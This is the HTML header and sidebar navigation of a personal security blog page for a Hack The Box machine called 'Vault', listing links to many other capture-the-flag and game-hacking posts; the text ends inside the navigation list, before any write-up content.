<!doctype html><html lang=en><head><title>[HTB] Machine: Vault</title>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:title" content="[HTB] Machine: Vault"><meta property="og:description" content="[HTB] Machine: Vault"><meta property="og:type" content="article"><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/vault/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-22T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-22T00:00:00+00:00"><meta name=description content="[HTB] Machine: Vault"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<span class=navbar-toggler-icon></span>
</button>
<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/guided-hacking/>Guided Hacking</a><ul><li><a href=/posts/cybersecurity/guided-hacking/dll-injector/ title="[Guided Hacking] DLL Injector">[Guided Hacking] DLL Injector</a></li><li><a href=/posts/cybersecurity/guided-hacking/external-trainer/ title="[Guided Hacking] External Trainer">[Guided Hacking] External Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/internal-trainer/ title="[Guided Hacking] Internal Trainer">[Guided Hacking] Internal Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/overview/ title="[Guided Hacking] Overview">[Guided Hacking] Overview</a></li><li><a href=/posts/cybersecurity/guided-hacking/shellcode-injector/ title="[Guided Hacking] Shellcode Injector">[Guided Hacking] Shellcode Injector</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ai/ title="[HTB] Machine: AI">[HTB] Machine: AI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/ title="[HTB] Machine: Apocalyst">[HTB] Machine: Apocalyst</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/aragog/ title="[HTB] Machine: Aragog">[HTB] Machine: Aragog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bitlab/ title="[HTB] Machine: Bitlab">[HTB] Machine: Bitlab</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/book/ title="[HTB] Machine: Book">[HTB] Machine: Book</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bucket/ title="[HTB] Machine: Bucket">[HTB] Machine: Bucket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cache/ title="[HTB] Machine: Cache">[HTB] Machine: Cache</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/canape/ title="[HTB] Machine: Canape">[HTB] Machine: Canape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/carrier/ title="[HTB] Machine: Carrier">[HTB] Machine: Carrier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/celestial/ title="[HTB] Machine: Celestial">[HTB] Machine: Celestial</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/chaos/ title="[HTB] Machine: Chaos">[HTB] Machine: Chaos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/craft/ title="[HTB] Machine: Craft">[HTB] Machine: Craft</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devoops/ title="[HTB] Machine: DevOops">[HTB] Machine: DevOops</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devzat/ title="[HTB] Machine: Devzat">[HTB] Machine: Devzat</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/dynstr/ title="[HTB] Machine: Dynstr">[HTB] Machine: Dynstr</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/enterprise/ title="[HTB] Machine: Enterprise">[HTB] Machine: Enterprise</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/europa/ title="[HTB] Machine: Europa">[HTB] Machine: Europa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/format/ title="[HTB] Machine: Format">[HTB] Machine: Format</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/gobox/ title="[HTB] Machine: Gobox">[HTB] Machine: Gobox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/hawk/ title="[HTB] Machine: Hawk">[HTB] Machine: Hawk</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inception/ title="[HTB] Machine: Inception">[HTB] Machine: Inception</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jarvis/ title="[HTB] Machine: Jarvis">[HTB] Machine: Jarvis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jewel/ title="[HTB] Machine: Jewel">[HTB] Machine: Jewel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/magic/ title="[HTB] Machine: Magic">[HTB] Machine: Magic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mango/ title="[HTB] Machine: Mango">[HTB] Machine: Mango</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nineveh/ title="[HTB] Machine: Nineveh">[HTB] Machine: Nineveh</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/node/ title="[HTB] Machine: Node">[HTB] Machine: Node</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/obscurity/ title="[HTB] Machine: Obscurity">[HTB] Machine: Obscurity</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/olympus/ title="[HTB] Machine: Olympus">[HTB] Machine: Olympus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/ title="[HTB] Machine: Ophiuchi">[HTB] Machine: Ophiuchi</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/passage/ title="[HTB] Machine: Passage">[HTB] Machine: Passage</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC">[HTB] Machine: PC</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pit/ title="[HTB] Machine: Pit">[HTB] Machine: Pit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ready/ title="[HTB] Machine: Ready">[HTB] Machine: Ready</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redcross/ title="[HTB] Machine: RedCross">[HTB] Machine: RedCross</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/schooled/ title="[HTB] Machine: Schooled">[HTB] Machine: Schooled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/seal/ title="[HTB] Machine: Seal">[HTB] Machine: Seal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shibboleth/ title="[HTB] Machine: Shibboleth">[HTB] Machine: Shibboleth</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/ title="[HTB] Machine: SneakyMailer">[HTB] Machine: SneakyMailer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/solidstate/ title="[HTB] Machine: SolidState">[HTB] Machine: SolidState</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stratosphere/ title="[HTB] Machine: Stratosphere">[HTB] Machine: Stratosphere</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/ title="[HTB] Machine: TartarSauce">[HTB] Machine: TartarSauce</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenet/ title="[HTB] Machine: Tenet">[HTB] Machine: Tenet</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/thenotebook/ title="[HTB] Machine: TheNotebook">[HTB] Machine: TheNotebook</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/time/ title="[HTB] Machine: Time">[HTB] Machine: Time</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unattended/ title="[HTB] Machine: Unattended">[HTB] Machine: Unattended</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unicode/ title="[HTB] Machine: Unicode">[HTB] Machine: Unicode</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union">[HTB] Machine: Union</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/linux/vault/ title="[HTB] Machine: Vault">[HTB] Machine: Vault</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo">[HTB] Machine: Waldo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/wall/ title="[HTB] Machine: Wall">[HTB] Machine: Wall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writer/ title="[HTB] Machine: Writer">[HTB] Machine: Writer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ypuffy/ title="[HTB] Machine: Ypuffy">[HTB] Machine: Ypuffy</a></li></ul></li><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/multimaster/ title="[HTB] Machine: Multimaster">[HTB] Machine: Multimaster</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: PivotAPI</a></li><li><a 